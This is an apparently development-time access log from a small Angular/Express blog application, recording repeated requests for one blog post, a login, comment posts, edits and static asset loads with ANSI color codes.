[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.416 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.453 ms - -[0m
[0mGET /api/blogs [32m200 [0m3.716 ms - 912[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.768 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.333 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.300 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.793 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.640 ms - -[0m
[0mPUT /api/blogs/6615c3d6c9d3b5533ecb8074 [32m200 [0m6.405 ms - 377[0m
[0mGET /api/blogs [32m200 [0m3.596 ms - 912[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [32m200 [0m2.423 ms - 377[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [32m200 [0m2.736 ms - 377[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.687 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.491 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.014 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m5.002 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.319 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m10.941 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.617 ms - -[0m
[0mGET /favicon.ico [36m304 [0m0.738 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m6.061 ms - -[0m
[0mGET /favicon.ico [36m304 [0m0.815 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.231 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.195 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.109 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.692 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.201 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.534 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.083 ms - -[0m
[0mPOST /api/login [32m200 [0m20.953 ms - 229[0m
[0mGET /favicon.ico [36m304 [0m0.867 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.890 ms - -[0m
[0mGET /api/blogs [32m200 [0m2.904 ms - 912[0m
[0mGET /favicon.ico [36m304 [0m0.650 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.020 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.504 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.006 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.281 ms - -[0m
[0mGET /favicon.ico [36m304 [0m0.622 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.517 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.483 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.573 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.099 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.828 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m5.362 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.231 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.030 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.238 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.657 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.053 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.540 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m8.768 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m17.671 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.910 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m5.905 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.881 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.826 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.803 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.165 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.594 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m6.746 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m5.258 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.323 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.181 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.384 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.793 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.743 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.753 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m6.206 ms - -[0m
[0mGET / [32m200 [0m0.821 ms - 11156[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.045 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.247 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.594 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.289 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.261 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.937 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.154 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.552 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.544 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.075 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.922 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.764 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.615 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.996 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.715 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.527 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.316 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.521 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.803 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.157 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.368 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.449 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.081 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.944 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.150 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m9.590 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.923 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.448 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.012 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.301 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.775 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.576 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.453 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.523 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.664 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.343 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.687 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.485 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.851 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.687 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.550 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.751 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.697 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.029 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.469 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.517 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.558 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.395 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.942 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.268 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.655 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.211 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.024 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.944 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.439 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m5.270 ms - -[0m
[0mPOST /api/blogs/6615c3d6c9d3b5533ecb8074/comments [32m200 [0m12.575 ms - 554[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [32m200 [0m2.839 ms - 554[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [32m200 [0m3.622 ms - 554[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.065 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.689 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.509 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.900 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.639 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.576 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.377 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.851 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m10.470 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.559 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m6.025 ms - -[0m
[0mPOST /api/blogs/6615c3d6c9d3b5533ecb8074/comments [32m200 [0m6.802 ms - 686[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [32m200 [0m2.744 ms - 686[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.099 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [32m200 [0m3.747 ms - 686[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.325 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.705 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.547 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.735 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.960 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.779 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.739 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.639 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m9.333 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m6.314 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.724 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.593 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.140 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.502 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.093 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.898 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.308 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.878 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.610 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.555 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.770 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.555 ms - -[0m
[0mGET /api/blogs [32m200 [0m5.013 ms - 1221[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.729 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.873 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.031 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.236 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.227 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.189 ms - -[0m
[0mPUT /api/blogs/6615c3d6c9d3b5533ecb8074 [32m200 [0m9.484 ms - 686[0m
[0mGET /api/blogs [32m200 [0m3.909 ms - 1221[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [32m200 [0m7.186 ms - 686[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m6.300 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.091 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.766 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.263 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.939 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.510 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.873 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.475 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.218 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.542 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m5.859 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.477 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m5.958 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.042 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.235 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.501 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.393 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.348 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.814 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.725 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.362 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.966 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m5.695 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.735 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.847 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.319 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.650 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.347 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.525 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m9.881 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m4.189 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.456 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.995 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.893 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m3.885 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.813 ms - -[0m
[0mGET /api/blogs/6615c3d6c9d3b5533ecb8074 [36m304 [0m2.622 ms - -[0m
[0mGET /login [36m304 [0m0.899 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.410 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.369 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.461 ms - -[0m
[0mGET /lib/angular.min.js [36m304 [0m0.509 ms - -[0m
[0mGET /lib/angular-route.min.js [36m304 [0m1.553 ms - -[0m
[0mGET /bloggerApp.js [32m200 [0m0.908 ms - 9133[0m
[0mGET /common/auth/authentication.js [36m304 [0m0.975 ms - -[0m
[0mGET /common/nav/navigation.js [36m304 [0m0.737 ms - -[0m
[0mGET /api/blogs [36m304 [0m2.892 ms - -[0m
[0mGET /common/nav/navigation.html [36m304 [0m0.465 ms - -[0m
